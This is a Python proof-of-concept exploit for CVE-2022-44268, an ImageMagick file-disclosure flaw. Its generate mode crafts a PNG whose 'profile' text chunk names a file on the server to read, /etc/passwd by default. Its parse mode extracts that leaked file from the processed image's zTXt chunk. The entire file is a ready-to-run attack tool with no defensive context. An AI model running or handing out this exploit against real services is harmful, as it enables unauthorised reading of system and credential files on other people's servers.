#!/usr/bin/env python3
import sys
import png
import zlib
import argparse
import binascii
import logging

logging.basicConfig(stream=sys.stderr, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
d = zlib.decompressobj()
e = zlib.compressobj()
IHDR = b'\x00\x00\x00\n\x00\x00\x00\n\x08\x02\x00\x00\x00'
IDAT = b'x\x9c\xbd\xcc\xa1\x11\xc0 \x0cF\xe1\xb4\x03D\x91\x8b`\xffm\x98\x010\x89\x01\xc5\x00\xfc\xb8\n\x8eV\xf6\xd9' \
       b'\xef\xee])%z\xef\xfe\xb0\x9f\xb8\xf7^J!\xa2Zkkm\xe7\x10\x02\x80\x9c\xf3\x9cSD\x0esU\x1dc\xa8\xeaa\x0e\xc0' \
       b'\xccb\x8cf\x06`gwgf\x11afw\x7fx\x01^K+F'


def parse_data(data: bytes) -> str:
    _, data = data.strip().split(b'\n', 1)
    return binascii.unhexlify(data.replace(b'\n', b'')).decode()


def read(filename: str):
    if not filename:
        logging.error('you must specify a input filename')
        return

    res = ''
    p = png.Reader(filename=filename)
    for k, v in p.chunks():
        logging.info("chunk %s found, value = %r", k.decode(), v)
        if k == b'zTXt':
            name, data = v.split(b'\x00', 1)
            res = parse_data(d.decompress(data[1:]))

    if res:
        sys.stdout.write(res)
        sys.stdout.flush()


def write(from_filename, to_filename, read_filename):
    if not to_filename:
        logging.error('you must specify a output filename')
        return

    with open(to_filename, 'wb') as f:
        f.write(png.signature)
        if from_filename:
            p = png.Reader(filename=from_filename)
            for k, v in p.chunks():
                if k != b'IEND':
                    png.write_chunk(f, k, v)
        else:
            png.write_chunk(f, b'IHDR', IHDR)
            png.write_chunk(f, b'IDAT', IDAT)

        png.write_chunk(f, b"tEXt", b"profile\x00" + read_filename.encode())
        png.write_chunk(f, b'IEND', b'')


def main():
    parser = argparse.ArgumentParser(description='POC for CVE-2022-44268')
    parser.add_argument('action', type=str, choices=('generate', 'parse'))
    parser.add_argument('-i', '--input', type=str, help='input filename')
    parser.add_argument('-o', '--output', type=str, help='output filename')
    parser.add_argument('-r', '--read', type=str, help='target file to read', default='/etc/passwd')
    args = parser.parse_args()
    if args.action == 'generate':
        write(args.input, args.output, args.read)
    elif args.action == 'parse':
        read(args.input)
    else:
        logging.error("bad action")


if __name__ == '__main__':
    main()
